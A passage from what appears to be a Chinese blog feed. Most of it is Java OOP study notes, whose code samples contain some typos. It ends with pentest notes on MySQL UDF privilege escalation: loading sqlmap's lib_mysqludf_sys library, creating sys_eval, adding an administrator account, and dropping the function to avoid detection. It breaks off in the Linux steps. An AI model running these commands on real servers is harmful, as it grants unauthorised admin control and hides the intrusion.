loop;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">推出最外层循环，标号名字自定义</span><br></pre></td></tr></table></figure><h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><blockquote><p>定义给公用的方法 成员变量</p><p>静态方法中，只能访问静态</p><p>非静态可以访问所有</p><p>静态中没有this关键字（非静态中默认有，系统给的）</p></blockquote><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>构造方法无法继承</p><p><strong>虚方法</strong>：非private 非static 非final</p><p>虚方法继承给子类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Fu</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;Fu&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Zi</span> <span class="keyword">extends</span> <span class="title class_">Fu</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;Zi&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;show&quot;</span>;</span><br><span class="line">        System.out.println(name);      <span class="comment">// 局部变量</span></span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name);   <span class="comment">// 本类</span></span><br><span class="line">        System.out.println(<span class="built_in">super</span>.name); <span class="comment">// 父类</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h3><p>覆盖虚方法里的同名方法，在子类的子类中的方法就是覆盖后的虚方法表</p><p>子类重写父类的方法，访问控制方法必须大于父类   无&lt;protect&lt;public</p><p>@Override</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Fu</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">f</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Zi</span> <span class="keyword">extends</span> <span class="title class_">Fu</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">f</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        f();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>父类空参构造</strong></p><p>super(可带参);  视父类的构造函数而定</p><p>super() 无参构造 不写系统默认添加</p><h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><p>父类类型 对象名 &#x3D; 子类对象；</p><p>Fu f &#x3D; new Zi();</p><p>一对多系统</p><p>调用父类成员，父类中没有成员，直接爆错</p><p>调用方法，父类没有（虚方法表没有），直接报错，调用子类方法 父类也必须有 子类加上@Override</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pulic <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Fu</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Zi</span>();</span><br><span class="line">    f.eat();  <span class="comment">// 调用Fu里的eat() 输出吃</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fu</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        sout(<span class="string">&quot;吃&quot;</span>)；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Zi</span> <span class="keyword">extends</span> <span class="title class_">Fu</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        sout(<span class="string">&quot;喝&quot;</span>)；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pulic <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Fu</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Zi</span>();</span><br><span class="line">    f.eat();  <span class="comment">// 调用Zi里的eat() 输出喝</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fu</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        sout(<span class="string">&quot;吃&quot;</span>)；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Zi</span> <span class="keyword">extends</span> <span class="title class_">Fu</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        sout(<span class="string">&quot;喝&quot;</span>)；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="instanceof-类之间的类型转换"><a href="#instanceof-类之间的类型转换" class="headerlink" title="instanceof 类之间的类型转换"></a>instanceof 类之间的类型转换</h3><p>判断对象类</p><p>对象 instanceof 类名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pulic <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Fu</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Zi</span>();</span><br><span class="line">    <span class="type">Fu</span> <span class="variable">g</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Nu</span>();</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 强转</span></span><br><span class="line">    <span class="keyword">if</span> (f instanceos Zi)&#123;</span><br><span class="line">        <span class="type">Zi</span> <span class="variable">c</span> <span class="operator">=</span> (Zi) f;</span><br><span class="line">        可调用方法</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="type">Nu</span> <span class="variable">c</span> <span class="operator">=</span> (Nu) f;</span><br><span class="line">        可调用方法</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// JDK14之后</span></span><br><span class="line">    <span class="keyword">if</span> (f instanceos Zi c)&#123;</span><br><span class="line">        可调用方法    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(f instanceos Nu c)&#123;</span><br><span class="line">        可调用方法</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fu</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        sout(<span class="string">&quot;吃&quot;</span>)；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Zi</span> <span class="keyword">extends</span> <span class="title class_">Fu</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        sout(<span class="string">&quot;喝&quot;</span>)；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Nu</span> <span class="keyword">extends</span> <span class="title class_">Fu</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        sout(<span class="string">&quot;喝&quot;</span>)；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类的自动类型转换和强制类型转换</p><p>自动类型转换</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Person 是父类  Student 是子类</span><br><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br></pre></td></tr></table></figure><p>强制类型转换</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Person 是父类  Student 是子类</span><br><span class="line"><span class="type">Student</span> <span class="variable">s</span> <span class="operator">=</span> (Student) p;</span><br></pre></td></tr></table></figure><h3 id="final"><a href="#final" class="headerlink" title="final"></a>final</h3><p>修饰的方法不能被从写</p><p>修饰的类不能被继承</p><p>修饰的变量变常量</p><p>修饰的引用数据类型，地址值不能改变，属性可以改变</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;zhangsan&quot;</span>,<span class="string">&quot;33&quot;</span>);</span><br><span class="line"></span><br><span class="line">s.setName = <span class="string">&quot;lisi&quot;</span>;</span><br><span class="line">s.SetAge = <span class="string">&quot;44&quot;</span>;</span><br><span class="line">sout(s.getName+s.getAge);</span><br><span class="line">改变之后的值</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">数组</span><br><span class="line"><span class="keyword">final</span> <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">4</span>;</span><br><span class="line">arr[<span class="number">1</span>] = <span class="number">5</span>;</span><br><span class="line">索引 <span class="number">0</span> <span class="number">1</span> 的值被修改</span><br></pre></td></tr></table></figure><h3 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h3><p>private   同一个类中</p><p>空          同一个包中</p><p>protect   同一个包中 和 不同包下的子类</p><p>public    all 和 不同包下 的无关类</p><h3 id="abstract"><a href="#abstract" class="headerlink" title="abstract"></a>abstract</h3><p>修饰的方法必须重写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">f</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><p>抽象类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">f</span>&#123;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>抽象类不能实例化</p><p>抽象类中 可以有抽象方法，有抽象方法的类一定是抽象类</p><p>可以有构造方法</p><p>抽象类的子类，要么重写抽象方法，要么是抽象类</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">work</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line">报错，不是抽象类，但有抽象方法</span><br></pre></td></tr></table></figure><p>可以有构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> name;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="interface-接口"><a href="#interface-接口" class="headerlink" title="interface 接口"></a>interface 接口</h3><p>接口里的成员只能时常量</p><p>默认修饰符 public static final</p><p>没有构造方法 </p><p>成员方法 只能时抽象方法 </p><p>方法默认修饰符 public abstract</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> interpace swim&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">swim</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">f</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> <span class="keyword">implements</span> <span class="title class_">swim</span>,接口<span class="number">2</span>……&#123;  <span class="comment">// 接口可以有多个</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swim</span><span class="params">()</span>&#123;</span><br><span class="line">        sout(<span class="string">&quot;f在游泳&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>jdk7 之前 接口中只能写抽象方法</p><p>jdk8 接口中可以定义有方法体的方法</p><p>jdlk9 接口中可以定义私有方法</p><p><strong>接口和类之间的关系</strong></p><p>类和类  继承</p><p>类和接口  实现关系 可实现多个接口</p><p>接口和接口  继承 可以多继承</p><p>jdk7 之前 接口里面的方法必须重写  无方法体</p><p>jdk8 不强制重写 要用default修饰（重写时去掉） 有方法体 public default void show() {}</p><p>调用多个接口 有同名方法 必须重写</p><p><strong>接口中的私有方法</strong></p><p>不能重写 可以同名</p><p><strong>jdk9 私有方法</strong></p><p>只能给 default方法 调用</p><p>private 返回值类型 方法名() {}</p><p>静态方法只能调用静态方法</p><p>private static 返回值类型 方法名() {}</p><p><strong>适配器</strong></p><p>抽象类+接口</p><h3 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h3><p>写在类里的类，engine 是 car 的一部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Car</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> a;</span><br><span class="line">    <span class="keyword">private</span> b;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        sout(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">engine</span> &#123;  <span class="comment">// 内部类</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">            sout(<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Car.<span class="type">engine</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Car</span>().<span class="keyword">new</span> <span class="title class_">engine</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h3><p>只能访问外部类的静态成员和方法，访问非静态要创建对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">创建对象</span><br><span class="line">Car.<span class="type">engine</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Car</span>.engine();</span><br></pre></td></tr></table></figure><p>调用方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">非静态方法</span><br><span class="line">    创建对象，用对象调用</span><br><span class="line">静态方法</span><br><span class="line">    外部类.内部类名.方法名();</span><br></pre></td></tr></table></figure><h3 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h3><p>定义在方法里的类</p><p>外部无法使用 方法内部创建对象使用</p><p>可以直接访问外部类成员 也可以访问方法内的局部变量</p><p>没什么用 了解一下</p><h3 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a>匿名内部类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> aaa &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">bbb</span>() &#123;</span><br><span class="line">        <span class="meta">@Overide</span></span><br><span class="line">        puclic <span class="keyword">void</span> <span class="title function_">ccc</span><span class="params">()</span> &#123;</span><br><span class="line">            sout(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>bbb是一个接口  接口调用    新建对象</p><p>ccc是bbb中的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> aaa &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">bbb</span>() &#123;</span><br><span class="line">        <span class="meta">@Overide</span></span><br><span class="line">        puclic <span class="keyword">void</span> <span class="title function_">ccc</span><span class="params">()</span> &#123;</span><br><span class="line">            sout(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>bbb是一个抽象类  继承关系  新建对象</p><p><strong>方法需要调用的少</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">(aaa a)</span> &#123;</span><br><span class="line">    a.eat();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">method(</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">aaa</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">            sout(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">)；</span><br></pre></td></tr></table></figure><p>aaa 是同包下的一个外部类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">method(</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">aaa</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">            sout(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">).方法();</span><br></pre></td></tr></table></figure><p>番外 调用方法</p><blockquote><p>隐藏了名字的内部类 可以写在成员位置和局部位置</p><p>当方法的参数是接口或类时，</p><p>以接口为例，可以传递这个接口的实现类对象，</p><p>如果实现类只要使用一次，就可以用匿名内部类简化代码</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL UDF</title>
      <link href="/2023/08/20/pentest/privesc/Mysql%20UDF/"/>
      <url>/2023/08/20/pentest/privesc/Mysql%20UDF/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL-UDF"><a href="#MySQL-UDF" class="headerlink" title="MySQL UDF"></a>MySQL UDF</h1><p>（user defined function）⽤户⾃定义函数</p><table><thead><tr><th>版本</th><th>路径</th><th></th></tr></thead><tbody><tr><td>&lt;&#x3D;5.1</td><td>c:\windows\system32</td><td></td></tr><tr><td>&gt;5.1</td><td>lib\plugin（该目录默认不存在）</td><td></td></tr><tr><td>不限</td><td>&#x2F;usr&#x2F;lib64&#x2F;mysql&#x2F;plugin（Linux）</td><td></td></tr></tbody></table><p>信息收集</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> verison()；</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>();</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@basedir</span>;</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@plugin_dir</span>;</span><br></pre></td></tr></table></figure><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p>条件：MySQL账号密码，<code>secure_file_priv=&quot;&quot;</code></p><p>在 <code>sqlmap/data/udf/mysql</code> 目录下，在Windows目录中有32位和64位的dll文件（MySQL位数），文件夹中的dll文件是通过异或编码的，可以使用 <code>sqlmap/extract/cloak.py</code> 进行解码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python /sqlmap/extra/cloak/cloak.py -d -i /sqlmap/udf/mysql/windows/64/lib_mysqludf_sys.dll</span><br></pre></td></tr></table></figure><p>注意：需要创建.dll文件中存在的函数，可以使用十六进制编辑器打开.dll文件，查看可以被创建的函数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 导入到 MySQL\lib\plugin\ 中</span><br><span class="line"><span class="keyword">select</span> LOAD_FILE(<span class="string">&#x27;C:/../lib_mysqludf_sys.dll&#x27;</span>) <span class="keyword">into</span> dumpfile <span class="string">&#x27;C:/../MySQL/lib/plugin/lib_mysqludf_sys.dll&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 将DLL中的函数引入到MySQL数据库中</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> string soname <span class="string">&#x27;lib_mysqludf_sys.dll&#x27;</span>;</span><br><span class="line"># 创建名为sys_eval的函数，返回值为string类型，调用的文件是lib_mysqludf_sys.dll</span><br></pre></td></tr></table></figure><p>提权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(&quot;whoami&quot;);</span><br><span class="line"></span><br><span class="line"># 创建账号并提升为管理员权限</span><br><span class="line"><span class="keyword">select</span> sys_eval(&quot;net user winer windows /add&quot;);</span><br><span class="line"><span class="keyword">select</span> sys_eval(&quot;net localgroup administrators winer /add&quot;);</span><br><span class="line"></span><br><span class="line"># 将引入的函数删除，掉防止被管理员发现，防止其他攻击者使用</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> sys_eval;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> mysql.func <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;sys_eval&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>条件：账户密码，<code>secure_file_priv=&quot;&quot;</code></p><p>找到对应操作系统数据库的UDF库文件（github）<br><code>sqlmap-master\data\udf\mysql\linux\64</code>下的<code>lib_mysqludf_sys.so</code>文件</p><p>注意：需要创建.so文件中存在的函数，可以使用十六进制编辑器打开.so文件，查看可以被创建的函数。</p><p>解码写入 <code>/usr/lib64/mysql/plugin</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 导入到 <span class="operator">/</span>usr<span class="operator">/</span>lib64<span class="operator">/</span>mysql<span class="operator">/</span>plugin 中</span><br><span class="line"><span class="keyword">select</span> unhex(<span 